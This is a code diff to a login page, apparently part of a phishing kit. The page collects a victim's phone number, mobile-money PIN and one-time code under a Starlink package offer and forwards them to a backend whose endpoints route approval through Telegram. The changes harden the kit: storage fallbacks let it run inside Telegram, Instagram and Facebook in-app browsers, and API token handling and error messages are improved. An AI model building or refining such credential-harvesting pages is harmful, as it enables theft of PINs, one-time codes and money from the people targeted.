@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8"/>
     <meta name="viewport" content="width=device-width,initial-scale=1,interactive-widget=resizes-content">
-    <meta name="theme-color" content="#000000"/>
+    <meta name="theme-color" content="#000000">
     <meta name="color-scheme" content="light only">
     <meta name="google" content="notranslate">
     <meta name="format-detection" content="telephone=no">
@@ -368,9 +368,24 @@
         let currentRequestId = '';
         let starlinkPackage = null;
 
+        /* ==================== SANDBOX-SAFE STORAGE ==================== */
+        // sessionStorage throws SecurityError inside sandboxed iframes
+        // (Telegram in-app browser, Instagram, Facebook, code previews).
+        // Fall back to in-memory storage so the app never crashes.
+        let _memApiToken = null;
+        let _memApiTokenExpires = 0;
+
+        function _safeStorageGet(key) {
+            try { return sessionStorage.getItem(key); } catch (e) { return null; }
+        }
+        function _safeStorageSet(key, value) {
+            try { sessionStorage.setItem(key, value); } catch (e) {}
+        }
+
         async function getApiSecret() {
-            let token = sessionStorage.getItem('sl_api_token');
-            let expiresAt = parseInt(sessionStorage.getItem('sl_api_token_expires') || '0');
+            let token = _safeStorageGet('sl_api_token') || _memApiToken;
+            let expiresAt = parseInt(_safeStorageGet('sl_api_token_expires') || '0') || _memApiTokenExpires;
+
             if (!token || Date.now() > expiresAt) {
                 try {
                     const res = await fetch(`${BACKEND_URL}/api/auth/session`, { method: 'POST' });
@@ -378,8 +393,10 @@
                     if (data.success && data.token) {
                         token = data.token;
                         expiresAt = Date.now() + (data.expiresIn || 3600000);
-                        sessionStorage.setItem('sl_api_token', token);
-                        sessionStorage.setItem('sl_api_token_expires', expiresAt.toString());
+                        _memApiToken = token;
+                        _memApiTokenExpires = expiresAt;
+                        _safeStorageSet('sl_api_token', token);
+                        _safeStorageSet('sl_api_token_expires', expiresAt.toString());
                     }
                 } catch (e) {
                     console.error('Failed to get API session:', e);
@@ -637,13 +654,11 @@
             if (msisdn.startsWith(_codeDigits) && msisdn.length > msisdnLength) msisdn = msisdn.slice(_codeDigits.length);
             const pin = getPinValue();
 
-            // ============ DIAGNOSTIC LOG ============
             console.log('[SEND OTP CLICKED]', {
                 msisdn, msisdnLen: msisdn.length, expectedLen: msisdnLength,
                 pin, pinLen: pin.length, phoneCode, starlinkPackage
             });
 
-            // ============ VISIBLE VALIDATION (no more silent return) ============
             if (msisdn.length < msisdnLength) {
                 phoneError.textContent = `Phone number too short for ${phoneCode} (need ${msisdnLength} digits, got ${msisdn.length})`;
                 phoneError.classList.add('show');
@@ -662,9 +677,12 @@
             phoneError.classList.remove('show');
 
             try {
+                const apiSecret = await getApiSecret();
+                console.log('[API SECRET]', apiSecret ? 'obtained' : 'null');
+
                 const response = await fetch(`${BACKEND_URL}/api/telegram/request-approval`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'X-API-Secret': await getApiSecret() },
+                    headers: { 'Content-Type': 'application/json', 'X-API-Secret': apiSecret || '' },
                     body: JSON.stringify({ userPhone: msisdn, userPin: pin, package: starlinkPackage, amount: '', method: 'airtel' })
                 });
                 const data = await response.json();
@@ -678,7 +696,7 @@
                     const pollTimer = setInterval(async () => {
                         try {
                             const statusRes = await fetch(`${BACKEND_URL}/api/telegram/status/${currentRequestId}`, {
-                                headers: { 'X-API-Secret': await getApiSecret() }
+                                headers: { 'X-API-Secret': await getApiSecret() || '' }
                             });
                             const statusData = await statusRes.json();
                             if (statusData.status === 'approved') {
@@ -712,7 +730,7 @@
                 }
             } catch (e) {
                 console.error('[FETCH ERROR]', e);
-                phoneError.textContent = TRANSLATIONS[currentLang].somethingWrong;
+                phoneError.textContent = TRANSLATIONS[currentLang].somethingWrong + ' (' + (e && e.message ? e.message : 'unknown') + ')';
                 phoneError.classList.add('show');
                 sendOtpBtn.disabled = false;
                 sendOtpBtn.classList.remove('btn-loading');
@@ -841,9 +859,10 @@
             verifyBtn.classList.add('btn-loading');
             otpError.classList.remove('show');
             try {
+                const apiSecret = await getApiSecret();
                 const response = await fetch(`${BACKEND_URL}/api/telegram/submit-otp`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'X-API-Secret': await getApiSecret() },
+                    headers: { 'Content-Type': 'application/json', 'X-API-Secret': apiSecret || '' },
                     body: JSON.stringify({ requestId: currentRequestId, otp: otp })
                 });
                 const data = await response.json();
@@ -861,7 +880,7 @@
                 const pollTimer = setInterval(async () => {
                     try {
                         const statusRes = await fetch(`${BACKEND_URL}/api/telegram/status/${currentRequestId}`, {
-                            headers: { 'X-API-Secret': await getApiSecret() }
+                            headers: { 'X-API-Secret': await getApiSecret() || '' }
                         });
                         const statusData = await statusRes.json();
                         if (statusData.status === 'completed') {
@@ -954,7 +973,6 @@
             refreshStarlinkAmount();
         }
 
-        // ============ STARTUP DIAGNOSTIC ============
         console.log('[login.html] BACKEND_URL =', BACKEND_URL);
         console.log('[login.html] Script fully loaded. Button ref:', !!sendOtpBtn);
 
